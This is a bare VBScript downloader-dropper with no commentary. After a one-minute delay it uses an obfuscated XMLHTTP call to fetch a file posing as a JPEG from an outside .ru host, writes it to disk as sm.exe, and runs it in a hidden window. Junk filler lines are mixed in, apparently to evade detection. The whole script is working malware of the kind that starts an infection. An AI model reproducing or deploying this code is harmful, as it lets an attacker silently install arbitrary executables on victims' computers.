Dim BD
Dim xml
WScript.Sleep(60000)
f5j545i = "MLH"
Set xml = CreateObject("Microsoft.X"+f5j545i+"TTP")
xml.Open "GET", "http://www.euro-motors.ru/img/3.jpg", False
xml.Send
C=C=C=C
BD = xml.ResponseBody
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
C=C=C=C
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
A=A=A=A
BinaryStream.Open
BinaryStream.Write BD
BinaryStream.SaveToFile "sm.exe", adSaveCreateOverWrite
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "sm.exe", 0, false
